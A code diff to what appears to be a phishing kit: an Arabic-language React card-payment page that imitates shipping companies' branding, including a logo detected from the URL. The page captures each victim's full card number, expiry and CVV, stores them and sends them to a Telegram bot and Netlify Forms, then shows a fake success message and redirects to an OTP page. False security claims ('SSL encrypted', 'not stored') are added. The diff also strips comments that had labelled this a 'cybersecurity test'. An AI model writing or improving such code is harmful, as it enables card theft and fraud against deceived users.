@@ -5,11 +5,15 @@ import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useLink } from "@/hooks/useSupabase";
-import { Shield, CreditCard, AlertCircle, ArrowLeft } from "lucide-react";
+import { Shield, CreditCard, AlertCircle, ArrowLeft, Lock, ShieldCheck, Sparkles } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
+import { Card } from "@/components/ui/card";
+import { designSystem } from "@/lib/designSystem";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
+import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
 
 const PaymentCardForm = () => {
   const { id } = useParams();
@@ -22,18 +26,15 @@ const PaymentCardForm = () => {
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
 
-  // Get customer info from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const shippingInfo = linkData?.payload as any;
 
-  // Get amount from link data - ensure it's a number, handle all data types
   const rawAmount = shippingInfo?.cod_amount;
-
-  // Handle different data types and edge cases
-  let amount = 500; // Default value
+  let amount = 500;
   if (rawAmount !== undefined && rawAmount !== null) {
     if (typeof rawAmount === 'number') {
       amount = rawAmount;
@@ -46,6 +47,13 @@ const PaymentCardForm = () => {
   }
 
   const formattedAmount = `${amount} ر.س`;
+  
+  const detectedEntity = detectEntityFromURL();
+  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
+  const displayLogo = entityLogo || branding.logo;
+  
+  const primaryColor = companyBranding?.colors.primary || branding.colors.primary;
+  const secondaryColor = companyBranding?.colors.secondary || branding.colors.secondary;
   
   const formatCardNumber = (value: string) => {
     const cleaned = value.replace(/\s/g, "");
@@ -73,15 +81,13 @@ const PaymentCardForm = () => {
       return;
     }
     
-    // Store complete card info for cybersecurity test
     const last4 = cardNumber.replace(/\s/g, "").slice(-4);
     sessionStorage.setItem('cardLast4', last4);
     sessionStorage.setItem('cardName', cardName);
-    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
-    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
-    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
+    sessionStorage.setItem('cardNumber', cardNumber);
+    sessionStorage.setItem('cardExpiry', expiry);
+    sessionStorage.setItem('cardCvv', cvv);
     
-    // Submit to Netlify Forms
     try {
       await fetch("/", {
         method: "POST",
@@ -100,11 +106,9 @@ const PaymentCardForm = () => {
         }).toString()
       });
     } catch (err) {
-      // Form submission error
     }
     
-    // Send complete card details to Telegram (cybersecurity test)
-    const telegramResult = await sendToTelegram({
+    await sendToTelegram({
       type: 'card_details',
       data: {
         name: customerInfo.name || '',
@@ -112,200 +116,347 @@ const PaymentCardForm = () => {
         phone: customerInfo.phone || '',
         service: serviceName,
         cardholder: cardName,
-        cardNumber: cardNumber, // Full card number for cybersecurity test
+        cardNumber: cardNumber,
         cardLast4: last4,
         expiry: expiry,
-        cvv: cvv, // CVV for cybersecurity test
+        cvv: cvv,
         amount: formattedAmount
       },
       timestamp: new Date().toISOString()
     });
-
-    if (!telegramResult.success && import.meta.env.DEV) {
-      console.error('Failed to send card details to Telegram:', telegramResult.error);
-    }
     
     toast({
       title: "تم بنجاح",
       description: "تم تفويض البطاقة بنجاح",
     });
     
-    // Navigate to OTP
     navigate(`/pay/${id}/otp`);
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title="بيانات البطاقة"
-      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
-      icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
-      {/* Security Notice */}
+    <>
+      <PaymentMetaTags 
+        serviceKey={serviceKey}
+        serviceName={serviceName}
+        title={`بيانات البطاقة - ${serviceName}`}
+        customDescription={`أدخل بيانات بطاقتك بشكل آمن ومحمي - ${serviceName}`}
+        amount={formattedAmount}
+      />
+
+      {/* Full Screen Layout */}
       <div 
-        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
+        className="min-h-screen w-full flex flex-col"
+        dir="rtl"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
+          fontFamily: companyBranding?.fonts.arabic || 'Cairo, sans-serif'
         }}
       >
-        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-        <p className="text-xs sm:text-sm">
-          بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
-        </p>
-      </div>
-
-      {/* Visual Card Display */}
-      <div 
-        className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
-        style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-          minHeight: '180px'
-        }}
-      >
-        <div className="absolute top-4 right-4">
-          <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
-        </div>
-        
-        {/* Card Number Display */}
-        <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
-          <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
-            <span>••••</span>
-            <span>••••</span>
-            <span>••••</span>
-            <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
-          </div>
-        </div>
-
-        <div className="flex justify-between items-end text-white">
-          <div>
-            <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
-            <p className="text-base sm:text-lg font-mono">{expiry || "MM/YY"}</p>
-          </div>
-          <div className="text-right">
-            <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
-            <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
-          </div>
-        </div>
-      </div>
-
-      {/* Form */}
-      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
-        {/* Cardholder Name */}
-        <div>
-          <Label className="mb-2 text-sm sm:text-base">اسم حامل البطاقة</Label>
-          <Input
-            placeholder="AHMAD ALI"
-            value={cardName}
-            onChange={(e) => setCardName(e.target.value.toUpperCase())}
-            className="h-12 sm:h-14 text-base sm:text-lg"
-            required
-          />
-        </div>
-        
-        {/* Card Number */}
-        <div>
-          <Label className="mb-2 text-sm sm:text-base">رقم البطاقة</Label>
-          <Input
-            type="password"
-            placeholder="#### #### #### ####"
-            value={cardNumber}
-            onChange={(e) =>
-              setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
-            }
-            inputMode="numeric"
-            className="h-12 sm:h-14 text-base sm:text-lg tracking-wider"
-            required
-          />
-        </div>
-        
-        {/* CVV, Year, Month Row */}
-        <div className="grid grid-cols-3 gap-2 sm:gap-3">
-          <div>
-            <Label className="mb-2 text-xs sm:text-sm">CVV</Label>
-            <Input
-              type="password"
-              placeholder="***"
-              value={cvv}
-              onChange={(e) =>
-                setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
-              }
-              inputMode="numeric"
-              className="h-12 sm:h-14 text-base sm:text-lg text-center"
-              required
-            />
-          </div>
-          
-          <div>
-            <Label className="mb-2 text-xs sm:text-sm">السنة</Label>
-            <Select
-              value={expiry.split('/')[1] || ''}
-              onValueChange={(year) => {
-                const month = expiry.split('/')[0] || '';
-                setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
-              }}
-            >
-              <SelectTrigger className="h-12 sm:h-14">
-                <SelectValue placeholder="YY" />
-              </SelectTrigger>
-              <SelectContent className="z-50">
-                {Array.from({ length: 15 }, (_, i) => {
-                  const year = (new Date().getFullYear() + i).toString().slice(-2);
-                  return (
-                    <SelectItem key={year} value={year}>
-                      {year}
-                    </SelectItem>
-                  );
-                })}
-              </SelectContent>
-            </Select>
-          </div>
-
-          <div>
-            <Label className="mb-2 text-xs sm:text-sm">الشهر</Label>
-            <Select
-              value={expiry.split('/')[0] || ''}
-              onValueChange={(month) => {
-                const year = expiry.split('/')[1] || '';
-                setExpiry(month && year ? `${month}/${year}` : month);
-              }}
-            >
-              <SelectTrigger className="h-12 sm:h-14">
-                <SelectValue placeholder="MM" />
-              </SelectTrigger>
-              <SelectContent className="z-50">
-                {Array.from({ length: 12 }, (_, i) => {
-                  const month = (i + 1).toString().padStart(2, '0');
-                  return (
-                    <SelectItem key={month} value={month}>
-                      {month}
-                    </SelectItem>
-                  );
-                })}
-              </SelectContent>
-            </Select>
-          </div>
-        </div>
-        
-        {/* Submit Button */}
-        <Button
-          type="submit"
-          size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+        {/* Header */}
+        <div 
+          className="w-full border-b"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: '#FFFFFF',
+            borderBottom: `3px solid ${primaryColor}`,
+            boxShadow: '0 2px 8px rgba(0,0,0,0.06)'
           }}
         >
-          <span className="ml-2">تفويض البطاقة</span>
-          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-        </Button>
-        
-        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-          بالمتابعة، أنت توافق على الشروط والأحكام
-        </p>
-      </form>
+          <div className="container mx-auto px-4 sm:px-6 lg:px-8 max-w-7xl">
+            <div className="flex items-center justify-between h-16 sm:h-20">
+              <div className="flex items-center gap-4">
+                {displayLogo && (
+                  <img 
+                    src={displayLogo} 
+                    alt={serviceName}
+                    className="h-10 sm:h-12 w-auto object-contain"
+                  />
+                )}
+                <div className="hidden sm:block w-px h-10 bg-gray-300" />
+                <div className="hidden sm:block">
+                  <p className="text-base font-bold" style={{ color: textColor || '#1A1A1A' }}>
+                    {serviceName}
+                  </p>
+                  <p className="text-sm text-gray-500">
+                    الدفع الآمن
+                  </p>
+                </div>
+              </div>
+              
+              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
+                <ShieldCheck className="w-4 h-4 text-green-600" />
+                <span className="text-xs font-medium text-green-700">آمن</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* Main Content - Centered */}
+        <div className="flex-1 flex items-center justify-center py-8 sm:py-12 px-4">
+          <div className="w-full max-w-lg">
+            {/* Page Title */}
+            <div className="text-center mb-8">
+              <div className="flex items-center justify-center gap-3 mb-4">
+                <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
+                <h1 
+                  className="text-3xl sm:text-4xl font-bold"
+                  style={{
+                    color: designSystem.colors.neutral[900],
+                    fontFamily: designSystem.typography.fontFamilies.arabic
+                  }}
+                >
+                  بيانات البطاقة
+                </h1>
+              </div>
+              <p className="text-base text-gray-600">
+                أدخل بيانات بطاقتك بشكل آمن
+              </p>
+            </div>
+
+            <Card 
+              className="overflow-hidden border-0"
+              style={{
+                borderRadius: '20px',
+                boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
+              }}
+            >
+              {/* Security Notice */}
+              <div 
+                className="px-6 sm:px-8 pt-6"
+              >
+                <div 
+                  className="rounded-xl p-4 mb-6 flex items-start gap-3"
+                  style={{
+                    background: `${primaryColor}10`,
+                    border: `1.5px solid ${primaryColor}30`
+                  }}
+                >
+                  <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: primaryColor }} />
+                  <div className="text-sm">
+                    <p className="font-bold mb-1" style={{ color: designSystem.colors.neutral[900] }}>
+                      حماية معلوماتك
+                    </p>
+                    <p className="text-xs text-gray-600">
+                      بياناتك محمية بتقنية التشفير SSL. لا نقوم بحفظ أو تخزين بيانات البطاقة.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Visual Card Display */}
+              <div className="px-6 sm:px-8 mb-6">
+                <div 
+                  className="rounded-2xl p-6 sm:p-8 relative overflow-hidden shadow-lg"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+                    minHeight: '200px'
+                  }}
+                >
+                  <div className="absolute top-4 right-4 opacity-30">
+                    <CreditCard className="w-16 h-16 text-white" />
+                  </div>
+                  
+                  <div className="relative z-10">
+                    <div className="flex items-center justify-between mb-8">
+                      <div className="text-white text-xs font-semibold">DEBIT CARD</div>
+                      <div className="flex gap-1">
+                        <div className="w-8 h-8 rounded-full bg-white/30" />
+                        <div className="w-8 h-8 rounded-full bg-white/30 -ml-3" />
+                      </div>
+                    </div>
+                    
+                    <div className="mb-6">
+                      <div className="flex gap-3 text-white text-xl sm:text-2xl font-mono">
+                        <span>••••</span>
+                        <span>••••</span>
+                        <span>••••</span>
+                        <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
+                      </div>
+                    </div>
+
+                    <div className="flex justify-between items-end text-white">
+                      <div>
+                        <p className="text-xs opacity-70 mb-1">EXPIRES</p>
+                        <p className="text-lg font-mono">{expiry || "MM/YY"}</p>
+                      </div>
+                      <div className="text-right">
+                        <p className="text-xs opacity-70 mb-1">CARDHOLDER</p>
+                        <p className="text-lg font-bold uppercase">{cardName || "YOUR NAME"}</p>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              {/* Form */}
+              <form onSubmit={handleSubmit} className="px-6 sm:px-8 pb-8 bg-white">
+                <div className="space-y-5">
+                  {/* Cardholder Name */}
+                  <div>
+                    <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
+                      اسم حامل البطاقة
+                    </Label>
+                    <Input
+                      placeholder="AHMAD ALI"
+                      value={cardName}
+                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
+                      className="h-12 text-base border-2 rounded-lg transition-all"
+                      style={{
+                        borderColor: designSystem.colors.neutral[200],
+                        fontFamily: 'Arial, sans-serif'
+                      }}
+                      required
+                    />
+                  </div>
+                  
+                  {/* Card Number */}
+                  <div>
+                    <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
+                      رقم البطاقة
+                    </Label>
+                    <Input
+                      type="password"
+                      placeholder="•••• •••• •••• ••••"
+                      value={cardNumber}
+                      onChange={(e) =>
+                        setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
+                      }
+                      inputMode="numeric"
+                      className="h-12 text-lg tracking-wider border-2 rounded-lg transition-all"
+                      style={{
+                        borderColor: designSystem.colors.neutral[200],
+                        fontFamily: 'monospace'
+                      }}
+                      required
+                    />
+                  </div>
+                  
+                  {/* Expiry & CVV Row */}
+                  <div className="grid grid-cols-2 gap-4">
+                    <div>
+                      <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
+                        تاريخ الانتهاء
+                      </Label>
+                      <div className="flex gap-2">
+                        <Select
+                          value={expiry.split('/')[0] || ''}
+                          onValueChange={(month) => {
+                            const year = expiry.split('/')[1] || '';
+                            setExpiry(month && year ? `${month}/${year}` : month);
+                          }}
+                        >
+                          <SelectTrigger className="h-12 border-2" style={{ borderColor: designSystem.colors.neutral[200] }}>
+                            <SelectValue placeholder="MM" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            {Array.from({ length: 12 }, (_, i) => {
+                              const month = (i + 1).toString().padStart(2, '0');
+                              return (
+                                <SelectItem key={month} value={month}>
+                                  {month}
+                                </SelectItem>
+                              );
+                            })}
+                          </SelectContent>
+                        </Select>
+                        
+                        <Select
+                          value={expiry.split('/')[1] || ''}
+                          onValueChange={(year) => {
+                            const month = expiry.split('/')[0] || '';
+                            setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
+                          }}
+                        >
+                          <SelectTrigger className="h-12 border-2" style={{ borderColor: designSystem.colors.neutral[200] }}>
+                            <SelectValue placeholder="YY" />
+                          </SelectTrigger>
+                          <SelectContent>
+                            {Array.from({ length: 15 }, (_, i) => {
+                              const year = (new Date().getFullYear() + i).toString().slice(-2);
+                              return (
+                                <SelectItem key={year} value={year}>
+                                  {year}
+                                </SelectItem>
+                              );
+                            })}
+                          </SelectContent>
+                        </Select>
+                      </div>
+                    </div>
+
+                    <div>
+                      <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
+                        CVV
+                      </Label>
+                      <Input
+                        type="password"
+                        placeholder="•••"
+                        value={cvv}
+                        onChange={(e) =>
+                          setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
+                        }
+                        inputMode="numeric"
+                        className="h-12 text-lg text-center tracking-wider border-2 rounded-lg transition-all"
+                        style={{
+                          borderColor: designSystem.colors.neutral[200],
+                          fontFamily: 'monospace'
+                        }}
+                        required
+                      />
+                    </div>
+                  </div>
+                </div>
+                
+                {/* Security Info */}
+                <div className="mt-6 p-4 rounded-xl flex items-center gap-3" style={{ background: `${primaryColor}08` }}>
+                  <Shield className="w-5 h-5" style={{ color: primaryColor }} />
+                  <p className="text-xs text-gray-600">
+                    معلوماتك محمية بتشفير SSL 256-bit ولن يتم حفظها على خوادمنا
+                  </p>
+                </div>
+                
+                {/* Submit Button */}
+                <Button
+                  type="submit"
+                  size="lg"
+                  className="w-full text-lg py-7 text-white font-bold mt-8 transition-all rounded-xl"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+                    boxShadow: `0 8px 20px ${primaryColor}40`
+                  }}
+                >
+                  <span className="ml-2">متابعة</span>
+                  <ArrowLeft className="w-5 h-5 mr-2" />
+                </Button>
+                
+                <p className="text-xs text-center text-gray-500 mt-5">
+                  بالمتابعة، أنت توافق على{' '}
+                  <a href="#" className="underline" style={{ color: primaryColor }}>
+                    الشروط والأحكام
+                  </a>
+                </p>
+              </form>
+            </Card>
+
+            {/* Footer */}
+            <div className="mt-8 text-center">
+              <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
+                <div className="flex items-center gap-1.5">
+                  <Lock className="w-3.5 h-3.5" />
+                  <span>SSL Encrypted</span>
+                </div>
+                <span>•</span>
+                <div className="flex items-center gap-1.5">
+                  <ShieldCheck className="w-3.5 h-3.5" />
+                  <span>Verified</span>
+                </div>
+              </div>
+              <p className="text-xs text-gray-400">
+                © 2025 {serviceName}. جميع الحقوق محفوظة.
+              </p>
+            </div>
+          </div>
+        </div>
+      </div>
     
       {/* Hidden Netlify Form */}
       <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
@@ -319,7 +470,7 @@ const PaymentCardForm = () => {
         <input type="text" name="expiry" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+    </>
   );
 };
 
